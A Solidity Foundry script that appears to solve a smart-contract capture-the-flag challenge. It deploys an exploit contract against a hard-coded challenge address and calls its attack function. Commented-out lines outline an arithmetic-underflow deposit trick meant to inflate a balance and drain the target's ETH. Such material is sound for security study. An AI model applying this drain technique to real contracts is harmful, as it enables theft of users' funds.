// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/W3BCXI.sol";
import "../src/Exploit.sol";
import "../src/Challenge.sol";

contract ChallengeScript is Script {
    Challenge public target;
    // address payable public attacker;
    Exploit public exploit;
    


    function setUp() public {
        // Connect to the already deployed contract
        target = Challenge(payable(address(0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249))); // Replace with actual contract address
        
        // exploit = new Exploit(0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249);
        // Set up attacker account with your private key
        // uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // attacker = payable(vm.addr(privateKey));
    }

    function run() public {
        vm.startBroadcast();
        exploit = new Exploit(payable(0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249));

        exploit.attack("Favour");

        
        // // Calculate overflow donation basis points
        // // We need fee > msg.value to trigger underflow
        // // Current fee is 3141 basis points
        // uint256 donationBps = 10000;
        
        // // Execute exploit
        // target.deposit{value: 1}(attacker, donationBps);
        
        // // Log manipulated balance
        // uint256 balance = target.viewDeposit(attacker);
        // console.log("Attacker's manipulated deposit:", balance);
        
        // // Withdraw everything
        // // target.rescueFunds();
        
        // // Verify success
        // // require(target.drained(), "Contract not drained");
        // // console.log("Contract successfully drained!");
        // console.log("Attacker's ETH balance:", attacker.balance);
        // console.log("Target's ETH balance:", target);
        
        vm.stopBroadcast();
    }
}